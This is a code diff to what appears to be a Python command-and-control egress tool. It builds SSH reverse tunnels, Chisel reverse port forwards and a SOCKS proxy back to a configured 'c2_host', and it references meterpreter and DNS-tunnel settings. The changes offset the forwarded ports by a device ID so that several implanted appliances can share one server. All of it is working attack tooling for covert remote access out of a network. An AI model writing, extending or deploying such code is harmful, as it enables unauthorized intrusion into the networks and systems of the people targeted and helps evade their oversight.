@@ -169,6 +169,8 @@ def _start_ssh_tunnels(c2_host, tunnel_cfg):
     ssh_port = tunnel_cfg.get("ssh_port", 22)
     ssh_user = tunnel_cfg.get("ssh_user", "root")
 
+    device_id = tunnel_cfg.get("_device_id", 0)
+
     if not forwards:
         log.warning("SSH tunnels: no forwards configured — skipping")
         return None
@@ -202,10 +204,11 @@ def _start_ssh_tunnels(c2_host, tunnel_cfg):
     for fwd in forwards:
         remote_host = fwd.get("remote_host", "127.0.0.1")
         cmd += ["-R", "%d:%s:%d" % (
-            fwd["local_port"], remote_host, fwd["remote_port"])]
+            fwd["local_port"] + device_id, remote_host, fwd["remote_port"])]
     cmd.append("%s@%s" % (ssh_user, c2_host))
 
-    log.info("Starting SSH reverse tunnels: %s", " ".join(cmd))
+    log.info("Starting SSH reverse tunnels (device_id=%d): %s",
+             device_id, " ".join(cmd))
     try:
         proc = subprocess.Popen(
             cmd,
@@ -229,7 +232,7 @@ def _start_ssh_tunnels(c2_host, tunnel_cfg):
         _ssh_tunnel_proc = proc
         for fwd in forwards:
             log.info("  SSH tunnel: server:%d → %s:%d (pid=%d)",
-                     fwd["local_port"],
+                     fwd["local_port"] + device_id,
                      fwd.get("remote_host", "127.0.0.1"),
                      fwd["remote_port"], proc.pid)
         return proc
@@ -343,6 +346,7 @@ def try_chisel(config):
     keepalive = chisel_cfg.get("keepalive", "25s")
     max_retry = chisel_cfg.get("max_retry_interval", "30s")
     socks_port = chisel_cfg.get("socks_port", 0)
+    device_id = config.get("c2", {}).get("device_id", 0)
 
     # Build forwards: chisel-specific list, or inherit from ssh_tunnels
     forwards = chisel_cfg.get("forwards", [])
@@ -384,15 +388,15 @@ def try_chisel(config):
 
     cmd.append(server_url)
 
-    # Reverse port forwards
+    # Reverse port forwards (offset by device_id for multi-appliance)
     for fwd in forwards:
         remote_host = fwd.get("remote_host", "127.0.0.1")
         cmd.append("R:%d:%s:%d" % (
-            fwd["local_port"], remote_host, fwd["remote_port"]))
+            fwd["local_port"] + device_id, remote_host, fwd["remote_port"]))
 
     # SOCKS proxy
     if socks_port:
-        cmd.append("R:%d:socks" % socks_port)
+        cmd.append("R:%d:socks" % (socks_port + device_id))
 
     log.info("Starting Chisel: %s", " ".join(cmd))
 
@@ -456,14 +460,16 @@ def try_chisel(config):
         _c2_method = "chisel"
         _current_state = EgressState.CONNECTED
 
-        log.info("Chisel connected to %s (pid=%d)", server_url, proc.pid)
+        log.info("Chisel connected to %s (pid=%d, device_id=%d)",
+                 server_url, proc.pid, device_id)
         for fwd in forwards:
             log.info("  Chisel: server:%d → %s:%d",
-                     fwd["local_port"],
+                     fwd["local_port"] + device_id,
                      fwd.get("remote_host", "127.0.0.1"),
                      fwd["remote_port"])
         if socks_port:
-            log.info("  Chisel: server:%d → SOCKS5 proxy", socks_port)
+            log.info("  Chisel: server:%d → SOCKS5 proxy",
+                     socks_port + device_id)
 
         return "chisel"
 
@@ -1251,10 +1257,13 @@ def run_cascade(config):
 
     c2_host = config["c2"]["host"]
     c2_ports = config["c2"]["ports"]
+    device_id = config.get("c2", {}).get("device_id", 0)
     chisel_cfg = config.get("chisel", {})
     dns_cfg = config.get("dns_tunnel", {})
     met_cfg = config.get("meterpreter", {})
     tunnel_cfg = config.get("ssh_tunnels")
+    if tunnel_cfg is not None:
+        tunnel_cfg["_device_id"] = device_id
 
     proxy = None
     # If proxy was detected and stored, use it
